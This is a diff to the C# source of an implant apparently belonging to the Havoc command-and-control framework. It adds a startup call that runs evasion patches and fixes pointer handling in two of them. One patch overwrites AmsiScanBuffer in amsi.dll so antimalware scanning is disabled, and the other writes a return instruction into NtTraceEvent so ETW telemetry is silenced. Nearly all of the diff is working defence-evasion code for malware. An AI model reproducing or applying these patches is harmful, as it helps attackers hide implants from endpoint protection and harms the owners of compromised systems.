@@ -65,6 +65,8 @@ namespace HavocImplant
 
         static async Task Main() // Looping through tasks and stuff
         {
+
+            RunPatches();
             Implant implant = new Implant();
             Random rand = new Random();
 
@@ -184,9 +186,11 @@ namespace HavocImplant
             IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
             dll amsi = new dll("amsi.dll");
             IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
+            
             IntPtr aPatchSize = (IntPtr)patch.Length;
             Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_READWRITE, out uint unused);
-            
+            pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"]; // Set it back correctly because Protect modified it to the base of the page
+
             GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
             Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, out unused);
             hPatch.Free();
@@ -197,7 +201,8 @@ namespace HavocImplant
             IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
             IntPtr ePatchSize = (IntPtr)1;
             Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, out unused);
-           
+            pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);// Set it back correctly because Protect modified it to the base of the page
+
             hPatch = GCHandle.Alloc(new byte[] { 0xc3 }, GCHandleType.Pinned);
             Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pNtTraceEvent, hPatch.AddrOfPinnedObject(), (uint)1, out unused);
             hPatch.Free();
